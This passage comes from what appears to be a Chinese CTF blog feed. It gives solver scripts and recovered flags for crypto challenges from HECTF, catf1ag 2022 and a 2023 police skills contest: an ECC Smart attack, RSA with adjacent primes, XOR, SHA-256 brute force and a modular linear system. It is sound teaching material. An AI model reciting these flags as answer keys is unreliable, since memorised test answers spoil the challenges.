number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> ZZ<span class="token punctuation">(</span>t<span class="token punctuation">)</span> <span class="token operator">+</span> randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token operator">*</span>p <span class="token keyword">for</span> t <span class="token keyword">in</span> E<span class="token punctuation">.</span>a_invariants<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">]</span><span class="token punctuation">)</span>     P_Qps <span class="token operator">=</span> Eqp<span class="token punctuation">.</span>lift_x<span class="token punctuation">(</span>ZZ<span class="token punctuation">(</span>P<span class="token punctuation">.</span>xy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">all</span><span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> P_Qp <span class="token keyword">in</span> P_Qps<span class="token punctuation">:</span>        <span class="token keyword">if</span> GF<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">(</span>P_Qp<span class="token punctuation">.</span>xy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> P<span class="token punctuation">.</span>xy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>     Q_Qps <span class="token operator">=</span> Eqp<span class="token punctuation">.</span>lift_x<span class="token punctuation">(</span>ZZ<span class="token punctuation">(</span>Q<span class="token punctuation">.</span>xy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">all</span><span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> Q_Qp <span class="token keyword">in</span> Q_Qps<span class="token punctuation">:</span>        <span class="token keyword">if</span> GF<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">(</span>Q_Qp<span class="token punctuation">.</span>xy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> Q<span class="token punctuation">.</span>xy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>     p_times_P <span class="token operator">=</span> p<span class="token operator">*</span>P_Qp    p_times_Q <span class="token operator">=</span> p<span class="token operator">*</span>Q_Qp     x_P<span class="token punctuation">,</span>y_P <span class="token operator">=</span> p_times_P<span class="token punctuation">.</span>xy<span class="token punctuation">(</span><span class="token punctuation">)</span>    x_Q<span class="token punctuation">,</span>y_Q <span class="token operator">=</span> p_times_Q<span class="token punctuation">.</span>xy<span class="token punctuation">(</span><span class="token punctuation">)</span>     phi_P <span class="token operator">=</span> <span class="token operator">-</span><span class="token punctuation">(</span>x_P<span class="token operator">/</span>y_P<span class="token punctuation">)</span>    phi_Q <span class="token operator">=</span> <span class="token operator">-</span><span class="token punctuation">(</span>x_Q<span class="token operator">/</span>y_Q<span class="token punctuation">)</span>    k <span class="token operator">=</span> phi_Q<span class="token operator">/</span>phi_P    <span class="token keyword">return</span> ZZ<span class="token punctuation">(</span>k<span class="token punctuation">)</span> r <span class="token operator">=</span> SmartAttack<span class="token punctuation">(</span>P<span class="token punctuation">,</span> Q<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token comment">#152675955744921</span>key<span class="token operator">=</span><span class="token string">b'152675955744921'</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">import</span> base64<span class="token keyword">def</span> <span class="token function">pad</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">16</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        text <span class="token operator">+=</span> <span class="token string">b' '</span>    <span class="token keyword">return</span> text <span class="token keyword">def</span> <span class="token function">pad_key</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">16</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        key <span class="token operator">+=</span> <span class="token string">b' '</span>    <span class="token keyword">return</span> key aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>pad_key<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span>c<span class="token operator">=</span><span class="token string">'bXaw/g8fD7taMjlL/OyqUJluD6dZI5GkZb9RrE5GQk8='</span>c0<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>c0<span class="token punctuation">)</span>flag<span class="token operator">=</span>aes<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>c0<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment">#HECTF&#123;N0w_you_know_ecc_and_AES!&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> match </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HECTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022天权信安&amp;catf1ag</title>
      <link href="/2023/03/14/2022%E5%A4%A9%E6%9D%83%E4%BF%A1%E5%AE%89-catf1ag/"/>
      <url>/2023/03/14/2022%E5%A4%A9%E6%9D%83%E4%BF%A1%E5%AE%89-catf1ag/</url>
      
        <content type="html"><![CDATA[<h1 id="2022天权信安-amp-catf1ag"><a href="#2022天权信安-amp-catf1ag" class="headerlink" title="2022天权信安&amp;catf1ag"></a>2022天权信安&amp;catf1ag</h1><h2 id="ezrsa"><a href="#ezrsa" class="headerlink" title="ezrsa"></a>ezrsa</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><pre class="line-numbers language-none"><code class="language-none"># from Crypto.Util.number import *# from flag import flag### def nextPrime(n):#     n +&#x3D; 2 if n &amp; 1 else 1#     while not isPrime(n):#         n +&#x3D; 2#     return n## p &#x3D; getPrime(1024)# q &#x3D; nextPrime(p)# n &#x3D; p * q# e &#x3D; 0x10001# d &#x3D; inverse(e, (p-1) * (q-1))# c &#x3D; pow(bytes_to_long(flag.encode()), e, n)#d&#x3D; 12344766091434434733173074189627377553017680360356962089159282442350343171988536143126785315325155784049041041740294461592715296364871912847202681353107182427067350160760722505537695351060872358780516757652343767211907987297081728669843916949983336698385141593880433674937737932158161117039734886760063825649623992179585362400642056715249145349214196969590250787495038347519927017407204272334005860911299915001920451629055970214564924913446260348649062607855669069184216149660211811217616624622378241195643396616228441026080441013816066477785035557421235574948446455413760957154157952685181318232685147981777529010093#c&#x3D; 11665709552346194520404644475693304343544277312139717618599619856028953672850971126750357095315011211770308088484683204061365343120233905810281045824420833988717463919084545209896116273241788366262798828075566212041893949256528106615605492953529332060374278942243879658004499423676775019309335825331748319484916607746676069594715000075912334306124627379144493327297854542488373589404460931325101587726363963663368593838684601095345900109519178235587636259017532403848656471367893974805399463278536349688131608183835495334912159111202418065161491440462011639125641718883550113983387585871212805400726591849356527011578#n&#x3D; 13717871972706962868710917190864395318380380788726354755874864666298971471295805029284299459288616488109296891203921497014120460143184810218680538647923519587681857800257311678203773339140281665350877914208278709865995451845445601706352659259559793431372688075659019308448963678380545045143583181131530985665822655263963917413080872997526445384954610888776917323156325542921415838122754036103689148810677276471252057077595104724365967333418002158480223657363936976281758713027828747277980907153645847605403914070601944617432177385048803228970693240587900504431163155958465431312258451026447435473865563581029300541109<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnume <span class="token operator">=</span> <span class="token number">0x10001</span>d<span class="token operator">=</span> <span class="token number">12344766091434434733173074189627377553017680360356962089159282442350343171988536143126785315325155784049041041740294461592715296364871912847202681353107182427067350160760722505537695351060872358780516757652343767211907987297081728669843916949983336698385141593880433674937737932158161117039734886760063825649623992179585362400642056715249145349214196969590250787495038347519927017407204272334005860911299915001920451629055970214564924913446260348649062607855669069184216149660211811217616624622378241195643396616228441026080441013816066477785035557421235574948446455413760957154157952685181318232685147981777529010093</span>c<span class="token operator">=</span> <span class="token number">11665709552346194520404644475693304343544277312139717618599619856028953672850971126750357095315011211770308088484683204061365343120233905810281045824420833988717463919084545209896116273241788366262798828075566212041893949256528106615605492953529332060374278942243879658004499423676775019309335825331748319484916607746676069594715000075912334306124627379144493327297854542488373589404460931325101587726363963663368593838684601095345900109519178235587636259017532403848656471367893974805399463278536349688131608183835495334912159111202418065161491440462011639125641718883550113983387585871212805400726591849356527011578</span>n<span class="token operator">=</span> <span class="token number">13717871972706962868710917190864395318380380788726354755874864666298971471295805029284299459288616488109296891203921497014120460143184810218680538647923519587681857800257311678203773339140281665350877914208278709865995451845445601706352659259559793431372688075659019308448963678380545045143583181131530985665822655263963917413080872997526445384954610888776917323156325542921415838122754036103689148810677276471252057077595104724365967333418002158480223657363936976281758713027828747277980907153645847605403914070601944617432177385048803228970693240587900504431163155958465431312258451026447435473865563581029300541109</span>p <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>n<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>q <span class="token operator">=</span> n <span class="token operator">//</span> p<span class="token comment"># d1 = gmpy2</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#flag&#123;3895dfda-67b1-11ed-b784-b07b2568d266&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="疑惑"><a href="#疑惑" class="headerlink" title="疑惑"></a>疑惑</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><pre class="line-numbers language-none"><code class="language-none">题目介绍：我好&quot;疑惑&quot;啊keys1 &#x3D; welcome_to_nine-ak_match_is_so_easy_!@!keys2 &#x3D; 20 4 24 5 94 12 2 36 26 6 49 11 68 15 14 114 12 10 43 14 9 43 10 27 31 31 22 45 10 48 58 4 18 10 38 31 14 97 92<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">keys1 <span class="token operator">=</span> <span class="token string">'welcome_to_nine-ak_match_is_so_easy_!@!'</span>keys2 <span class="token operator">=</span> <span class="token string">'20 4 24 5 94 12 2 36 26 6 49 11 68 15 14 114 12 10 43 14 9 43 10 27 31 31 22 45 10 48 58 4 18 10 38 31 14 97 92'</span>keys2 <span class="token operator">=</span> keys2<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>keys1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token builtin">int</span><span class="token punctuation">(</span>keys2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token comment"># catf1ag&#123;nine-ak_match_is@very_easy_@/!&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><pre class="line-numbers language-none"><code class="language-none">题目描述：小cat是某公司的安全侦察人员，在2022年9月9日凌晨6点，小cat抓取到了几条疑似a人员和b人员交流的包，经过破译，大致意思是“在今年xx月xx日xx点xx分准时进行数据交易”，但是唯独不能完全破解出来，于是他发到公司的网络安全群寻求帮助：69d00d9bc39e01687abf84e98e27c889cf1442b53edba27d3235acbeb7b0ae95（密文格式是：年份必须是4位数，月日时分必须是两位数，需要用0补齐，比如2022年01月01日01时01分）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="脚本-2"><a href="#脚本-2" class="headerlink" title="脚本"></a>脚本</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">c <span class="token operator">=</span> <span class="token string">'69d00d9bc39e01687abf84e98e27c889cf1442b53edba27d3235acbeb7b0ae95'</span><span class="token keyword">import</span> hashlib<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> m <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">61</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>                    i <span class="token operator">=</span> <span class="token string">'0'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>                    j <span class="token operator">=</span> <span class="token string">'0'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>                    k <span class="token operator">=</span> <span class="token string">'0'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>                    m <span class="token operator">=</span> <span class="token string">'0'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>                tmp <span class="token operator">=</span> <span class="token string">'2022'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>                <span class="token comment"># print(tmp)</span>                md <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">)</span>                md<span class="token punctuation">.</span>update<span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> md<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> c<span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token comment">#catf1ag&#123;202211121750&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者直接在CMD5利用会员解密</p>]]></content>
      
      
      <categories>
          
          <category> match </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2022天权信安&amp;catf1ag </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023黄河流域公安网络技能挑战赛</title>
      <link href="/2023/03/06/2023%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E5%85%AC%E5%AE%89%E7%BD%91%E7%BB%9C%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/"/>
      <url>/2023/03/06/2023%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E5%85%AC%E5%AE%89%E7%BD%91%E7%BB%9C%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>官方wp</p><p><a href="https://rb61qxxiv7.feishu.cn/docs/doccnFcZA8xHDlJNUFQs4QEXqvg">https://rb61qxxiv7.feishu.cn/docs/doccnFcZA8xHDlJNUFQs4QEXqvg</a></p><p>当时由于比赛时有事就打了一个小时</p><h1 id="Checkin"><a href="#Checkin" class="headerlink" title="Checkin"></a>Checkin</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnum<span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">282422904082982258621075610259452215824075271484821245626055284049965141753838118483499225118037659155776469308266679236514939371151200503486860900710638249138056870980395564136760046944176702722154502092895865522544199762580857041717582699398798829888596539858995029585412945532785867079274113878154724845910389733183058666310229884356997245</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">Mu.Chen_is_the_most_handsome_boy_in_SDPC_and_he_don&#39;t_have_girlfriend!!!!!!!By_the_way_here_is_your_flag&#123;705bc7ea-e9e1-4996-a28f-dd962a777170&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="My-enc"><a href="#My-enc" class="headerlink" title="My_enc"></a>My_enc</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> secret <span class="token keyword">import</span> flag<span class="token keyword">import</span> random<span class="token keyword">def</span> <span class="token function">Cyber_key</span><span class="token punctuation">(</span>LEN<span class="token punctuation">)</span><span class="token punctuation">:</span>    Key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>LEN<span class="token punctuation">)</span><span class="token punctuation">:</span>            Key<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2023</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> Key<span class="token keyword">def</span> <span class="token function">Punk_enc</span><span class="token punctuation">(</span>Key<span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">:</span>    out <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> l <span class="token keyword">in</span> Key<span class="token punctuation">:</span>        s <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> x<span class="token punctuation">,</span> y <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">:</span>            s <span class="token operator">+=</span> <span class="token punctuation">(</span>x <span class="token operator">*</span> y<span class="token punctuation">)</span> <span class="token operator">%</span> P            s <span class="token operator">%=</span> P        out<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">)</span>    <span class="token keyword">return</span> out<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    P <span class="token operator">=</span> <span class="token number">2048</span>    row <span class="token operator">=</span> <span class="token number">66</span>    key <span class="token operator">=</span> Cyber_key<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>    c <span class="token operator">=</span> Punk_enc<span class="token punctuation">(</span>key<span class="token punctuation">,</span> flag<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#sage</span>P <span class="token operator">=</span> <span class="token number">2048</span>key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">505</span><span class="token punctuation">,</span> <span class="token number">469</span><span class="token punctuation">,</span> <span class="token number">528</span><span class="token punctuation">,</span> <span class="token number">1798</span><span class="token punctuation">,</span> <span class="token number">373</span><span class="token punctuation">,</span> <span class="token number">987</span><span class="token punctuation">,</span> <span class="token number">981</span><span class="token punctuation">,</span> <span class="token number">438</span><span class="token punctuation">,</span> <span class="token number">1438</span><span class="token punctuation">,</span> <span class="token number">1918</span><span class="token punctuation">,</span> <span class="token number">768</span><span class="token punctuation">,</span> <span class="token number">980</span><span class="token punctuation">,</span> <span class="token number">720</span><span class="token punctuation">,</span> <span class="token number">336</span><span class="token punctuation">,</span> <span class="token number">1763</span><span class="token punctuation">,</span> <span class="token number">585</span><span class="token punctuation">,</span> <span class="token number">1582</span><span class="token punctuation">,</span> <span class="token number">1020</span><span class="token punctuation">,</span> <span class="token number">601</span><span class="token punctuation">,</span> <span class="token number">1543</span><span class="token punctuation">,</span> <span class="token number">1374</span><span class="token punctuation">,</span> <span class="token number">1904</span><span class="token punctuation">,</span> <span class="token number">340</span><span class="token punctuation">,</span> <span class="token number">326</span><span class="token punctuation">,</span> <span class="token number">947</span><span class="token punctuation">,</span> <span class="token number">639</span><span class="token punctuation">,</span> <span class="token number">1143</span><span class="token punctuation">,</span> <span class="token number">371</span><span class="token punctuation">,</span> <span class="token number">359</span><span class="token punctuation">,</span> <span class="token number">953</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">657</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">359</span><span class="token punctuation">,</span> <span class="token number">280</span><span class="token punctuation">,</span> <span class="token number">1903</span><span class="token punctuation">,</span> <span class="token number">687</span><span class="token punctuation">,</span> <span class="token number">371</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">1232</span><span class="token punctuation">,</span> <span class="token number">1573</span><span class="token punctuation">,</span> <span class="token number">743</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1310</span><span class="token punctuation">,</span> <span class="token number">205</span><span class="token punctuation">,</span> <span class="token number">491</span><span class="token punctuation">,</span> <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">1743</span><span class="token punctuation">,</span> <span class="token number">1185</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">1797</span><span class="token punctuation">,</span> <span class="token number">867</span><span class="token punctuation">,</span> <span class="token number">755</span><span class="token punctuation">,</span> <span class="token number">967</span><span class="token punctuation">,</span> <span class="token number">454</span><span class="token punctuation">,</span> <span class="token number">800</span><span class="token punctuation">,</span> <span class="token number">568</span><span class="token punctuation">,</span> <span class="token number">625</span><span class="token punctuation">,</span> <span class="token number">492</span><span class="token punctuation">,</span> <span class="token number">1835</span><span class="token punctuation">,</span> <span class="token number">1586</span><span class="token punctuation">,</span> <span class="token number">1462</span><span class="token punctuation">,</span> <span class="token number">619</span><span class="token punctuation">,</span> <span class="token number">760</span><span class="token punctuation">,</span> <span class="token number">1144</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">1764</span><span class="token punctuation">,</span> <span class="token number">1356</span><span class="token punctuation">,</span> <span class="token number">991</span><span class="token punctuation">,</span> <span class="token number">1392</span><span class="token punctuation">,</span> <span class="token number">816</span><span class="token punctuation">,</span> <span class="token number">849</span><span class="token punctuation">,</span> <span class="token number">259</span><span class="token punctuation">,</span> <span class="token number">1305</span><span class="token punctuation">,</span> <span class="token number">842</span><span class="token punctuation">,</span> <span class="token number">1250</span><span class="token punctuation">,</span> <span class="token number">1983</span><span class="token punctuation">,</span> <span class="token number">1339</span><span class="token punctuation">,</span> <span class="token number">752</span><span class="token punctuation">,</span> <span class="token number">1170</span><span class="token punctuation">,</span> <span class="token number">1976</span><span class="token punctuation">,</span> <span class="token number">958</span><span class="token punctuation">,</span> <span class="token number">1710</span><span class="token punctuation">,</span> <span class="token number">1216</span><span class="token punctuation">,</span> <span class="token number">1927</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1507</span><span class="token punctuation">,</span> <span class="token number">1699</span><span class="token punctuation">,</span> <span class="token number">1536</span><span class="token punctuation">,</span> <span class="token number">1708</span><span class="token punctuation">,</span> <span class="token number">739</span><span class="token punctuation">,</span> <span class="token number">902</span><span class="token punctuation">,</span> <span class="token number">1169</span><span class="token punctuation">,</span> <span class="token number">1352</span><span class="token punctuation">,</span> <span class="token number">886</span><span class="token punctuation">,</span> <span class="token number">680</span><span class="token punctuation">,</span> <span class="token number">1400</span><span class="token punctuation">,</span> <span class="token number">1011</span><span class="token punctuation">,</span> <span class="token number">132</span><span class="token punctuation">,</span> <span class="token number">1561</span><span class="token punctuation">,</span> <span class="token number">1001</span><span class="token punctuation">,</span> <span class="token number">772</span><span class="token punctuation">,</span> <span class="token number">1809</span><span class="token punctuation">,</span> <span class="token number">208</span><span class="token punctuation">,</span> <span class="token number">1161</span><span class="token 